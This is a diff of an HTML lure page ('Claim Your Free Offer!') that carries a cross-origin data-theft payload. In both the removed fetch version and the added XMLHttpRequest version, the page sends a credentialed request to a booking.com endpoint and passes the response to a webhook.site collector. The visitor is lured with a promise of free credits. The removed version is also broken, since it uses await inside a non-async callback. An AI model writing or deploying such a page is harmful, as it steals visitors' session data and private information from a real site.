@@ -1,24 +1,22 @@
-<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Free ClassDojo Credits!</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Malicious Script</title>
 </head>
 <body>
-  <h1>Click to claim your free credits!</h1>
-<script>  
-fetch('https://accommodations.booking.com/autocomplete.json', {  
-  credentials: 'include'  
-})  
-.then(r => {  
-  // Send FULL request headers to your server (includes cookies!)  
-  fetch('https://webhook.site/77be87a4-2b5c-4a85-a81b-cec771bd6a73l', {  
-    method: 'POST',  
-    body: JSON.stringify({  
-      headers: [...r.headers.entries()],  
-      data: await r.text()  
-    })  
-  });  
-});  
-</script>  
+  <h1>Claim Your Free Offer!</h1>
+  <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('GET', 'https://accommodations.booking.com/autocomplete.json', true);
+    req.withCredentials = true; // Send cookies with the request
+    req.send();
+        function reqListener() {
+      // Exfiltrate sensitive data to an external server
+        location = 'https://webhook.site/77be87a4-2b5c-4a85-a81b-cec771bd6a73? 
+       data=' + encodeURIComponent(this.responseText);
+        }
+  </script>
 </body>
 </html>
